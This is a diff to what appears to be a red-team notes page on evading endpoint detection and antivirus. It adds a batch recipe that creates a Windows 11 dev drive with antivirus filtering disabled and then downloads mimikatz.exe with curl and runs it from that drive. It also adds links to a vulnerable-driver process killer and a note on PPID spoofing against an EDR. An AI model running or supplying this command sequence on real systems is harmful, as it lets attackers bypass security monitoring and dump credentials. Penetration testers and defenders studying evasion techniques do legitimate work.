@@ -33,6 +33,27 @@ Import-Module ./CheckDLLs.ps1
 Get-Process | Check-DLLs -ModuleNames 'InProcessClient.dll', 'InProcessClient64.dll', 'MinProcessClient.dll', 'MinProcessClient64.dll' | ?{!$_.'InProcessClient.dll' -and !$_.'InProcessClient64.dll'} | ft -auto
 ~~~
 
+Create a dev drive as local admin on Windows 11 (untested, [source](https://twitter.com/0gtweet/status/1720532496847167784)).
+
+~~~ bat
+fsutil.exe devdrv enable
+fsutil.exe devdrv enable /disallowav
+echo create vdisk file="c:\temp\mimi.vhdx" maximum=10240 type=expandable >> .\diskpart.txt
+echo select vdisk file="c:\temp\mimi.vhdx" >> .\diskpart.txt
+echo attach vdisk >> .\diskpart.txt
+echo create partition primary >> .\diskpart.txt
+echo assign letter=v >> .\diskpart.txt
+echo exit >> .\diskpart.txt
+diskpart.exe /s .\diskpart.txt
+del .\diskpart.txt
+format.exe v: /devdrv /q /y
+fsutil.exe devdrv clearFiltersAllowed v:
+fsutil.exe devdrv trust v:
+fsutil.exe devdrv query v:
+curl.exe -o v:\mimi.exe https://.../mimikatz.exe
+v:\mimi.exe
+~~~
+
 Untested tools:
 
 - [TimeException](https://github.com/bananabr/TimeException), detect excluded folders trough timing discrepancies
@@ -100,7 +121,7 @@ References:
 - [Old certificate, new signature: Open-source tools forge signature timestamps on Windows drivers](http://web.archive.org/web/20230712010119/https://blog.talosintelligence.com/old-certificate-new-signature/)
 - [Attacking an EDR - Part 2](http://web.archive.org/web/20230914130817/https://her0ness.github.io/2023-09-14-Attacking-an-EDR-Part-2/), disable EDRs tamper protection by intercepting an API response with Burp
 - [Reverse Engineering Windows Defender's Antivirus Emulator - Black Hat 2018](https://www.youtube.com/watch?v=wDNQ-8aWLO0)
-- [Attacking an EDR - Part 1](http://web.archive.org/web/20230804174921/https://riccardoancarani.github.io/2023-08-03-attacking-an-edr-part-1/), EDR whitelisted own helper process, but did not protect it, detected because process didn't hat the EDRs hooking DLL loaded
+- [Attacking an EDR - Part 1](http://web.archive.org/web/20230804174921/https://riccardoancarani.github.io/2023-08-03-attacking-an-edr-part-1/), EDR whitelisted own helper process, but did not protect it, detected because process didn't had the EDRs hooking DLL loaded, exploited with PPID spoofing
 - [Dissecting the Windows Defender Driver - WdFilter (Part 1)](http://web.archive.org/web/20230204015856/https://n4r1b.com/posts/2020/01/dissecting-the-windows-defender-driver-wdfilter-part-1/)
 - [Attacking on Behalf of Defense: DLL Sideloading EDR Binaries](http://web.archive.org/web/20230627204035/https://mansk1es.gitbook.io/edr-binary-abuse/)
 - [Operators, EDR Sensors, and OODA Loops](http://web.archive.org/web/20230802194355/https://jackson_t.gitlab.io/ooda-loops.html)
@@ -138,6 +159,7 @@ Tested tools:
 
 Untested tools:
 
+- [GhostDriver](https://github.com/BlackSnufkin/GhostDriver), in Rust, uses `rentdrv.sys`
 - [LOLDrivers Finder](https://github.com/xalicex/LOLDrivers_finder/blob/main/finder.py), search LolDrivers for drivers that can kill processes
 - [mhydeath](https://github.com/zer0condition/mhydeath), uses `mhyprotect.sys`
 - [NVDrv](https://github.com/zer0condition/NVDrv), uses `nvoclock.sys` to read arbitrary memory
